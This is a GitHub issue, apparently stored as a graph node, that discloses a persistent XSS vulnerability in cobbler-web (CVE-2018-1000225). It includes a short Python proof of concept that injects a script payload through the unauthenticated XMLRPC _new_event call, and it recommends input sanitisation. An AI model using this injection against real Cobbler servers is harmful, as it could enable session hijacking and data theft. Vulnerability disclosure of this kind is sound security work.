    <node id="cobbler/cobbler#1917">
      <data key="d0">Issue</data>
      <data key="d2">Persistent XSS vulnerability in cobbler-web [CVE-2018-1000225]</data>
      <data key="d3">cobbler-web renders HTML and executes JavaScript payloads that are provided by users.
Combined with [authentication problems in the Cobbler XMLRPC API](https://github.com/cobbler/cobbler/issues/1916), this allows unauthenticated users to inject malicious payloads into the web UI.

A harmless Proof of Concept script:

```python
import xmlrpc.client

cobbler_connection = xmlrpc.client.ServerProxy("http://127.0.0.1/cobbler_api", allow_none=True)

payload = """
&lt;button onclick="myFunction()"&gt;Click me!&lt;/button&gt;

&lt;script&gt;
function myFunction() {
    alert("Hah! you clicked!");
}
&lt;/script&gt;
"""

cobbler_connection._new_event(payload)
```

Then when you visit the `cobbler_web/events` endpoint:

![cobbler_js_event](https://user-images.githubusercontent.com/1459385/43592082-4e796034-9664-11e8-827b-3e508e39aaed.png)

These payloads can be used to hijack the sessions of administrator and perform actions that the attacker would otherwise be unable to, or to exfiltrate sensitive information.

cobbler-web should sanitize all user provided inputs, and treat them as untrusted. This included never rendering user provided HTML, nor executing user provided JavaScript.

See [this post](https://movermeyer.com/2018-08-02-privilege-escalation-exploits-in-cobblers-api/) for more discussion.</data>
      <data key="d4">["Bug Report", "Security", "Priority", "Web-interface"]</data>
      <data key="d1">python</data>
    </node>
